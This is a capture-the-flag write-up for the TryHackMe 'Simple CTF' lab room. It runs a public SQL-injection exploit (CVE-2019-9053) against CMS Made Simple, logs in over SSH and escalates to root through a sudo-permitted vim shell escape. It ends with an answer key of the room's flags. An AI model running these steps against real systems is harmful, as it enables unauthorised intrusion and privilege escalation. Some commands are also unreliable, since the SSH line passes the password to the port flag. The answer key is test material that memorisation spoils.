# THM - simple CTF
**security - enumeration - privesc**

## Enumeration
IP Address : 10.10.24.237
### 1.1 
#### nmap
**nmap -A 10.10.24.237**
21 ftp 
80 http
2222 open ssh
### 1.2 
#### gobuster
**gobuster dir -u http://10.10.24.237 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt** 
/simple 
	cms (cmsms), if scroll we find version 2.2.8
/server-status => forbidden
### 1.3 
#### searchsploit
**searchsploit CMS Made simple | grep "2.x*"** 
CMS Made Simple < 2.2.10 - SQL Injection | php/webapps/46635.py
CVE-2019-9053:
"An issue was discovered in CMS Made Simple 2.2.8. It is possible with the News module, through a crafted URL, to achieve unauthenticated blind time-based SQL injection via the m1_idlist parameter."
### Conclusion, vulnerabilities
3 open ports, I put my efforts to the 80. 
Finding two paths, with one look like interesting : /simple.
It's a CMS, and we know his version. 
Using exploit-db to find if a vulnerability is known for this version of CMS.
It seems like a sql injection is possible.

## Exploit
### 1.1
#### 46635.py
**searchsploit -p 46635**
Use -p flag to dl the script
**python /opt/searchsploit/exploits/php/webapps/46635.py -u https://10.10.24.237/ -c -w /usr/share/wordlists/rockyou.txt**
username : mitch and pass cracked : secret
### 1.2
#### SSH
**ssh mitch@10.10.24.237 -p secret**
**python -c 'import pty; pty.spawn("/bin/bash")'**
Stabilize shell
### 1.3
#### Enumeration
**ls -la**
drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
### Conclusion
46635.py script work, the next step is jsut to connect with ssh protocol and find the flag.

## Privilege escalation
### 1.1  
#### sudo 
**sudo -l**
/usr/bin/vim
### 1.2  
#### GTFOBins 
Searching to GTOFBins website if a exploit exist to vim : **sudo vim -c ':!/bin/sh'**
**whoami : root**
**ls -la : root.txt**
### Conclusion
This user are able to lauch vim command with root permissions, so I rewrite the content of this command in order to invoke a shell, who start with root privilege.

## Responses
### How many services are running under port 1000? : 
**2**
### What is running on the higher port? : 
**ssh**
### What's the CVE you're using against the application? : 
**CVE-2019-9053**
### To what kind of vulnerability is the application vulnerable? : 
**sqli**
### What's the password? : 
**secret**
### Where can you login with the details obtained? : 
**ssh**
### What's the user flag? : 
**G00d j0b, keep up!**
### Is there any other user in the home directory? : 
**sunbath**
### What can you leverage to spawn a privileged shell? : 
**vim**
### What's the root flag? : 
**W3ll d0n3. You made it!**